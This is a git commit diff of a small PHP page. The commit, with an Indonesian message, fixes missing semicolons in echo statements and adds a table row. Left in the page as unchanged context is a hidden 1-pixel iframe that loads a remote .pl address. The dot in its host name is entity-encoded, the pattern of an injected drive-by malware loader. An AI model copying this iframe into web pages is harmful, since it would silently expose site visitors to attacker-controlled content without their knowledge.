400d426adac21f6407ee23a87283d4acf474ac7d
nendi <narumitaiga.nendi813@gmail.com>
2015-03-09 13:31:17 +0700

    ditambah oleh nendi

--- 2.php
+++ 2.php
@@ -4,9 +4,10 @@
 
 echo "Tulisan afinka";
 echo" nendi menambahkan";
-echo"<table border='1'>"
-echo"<tr><td>lalalalalla</td></tr>
-echo"</table>
+echo"<table border='1'>";
+echo"<tr><td>lalalalalla</td></tr>";
+echo"<tr><td>babababbababa</td></tr>";
+echo"</table>";
 ?>
 <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
 </body>
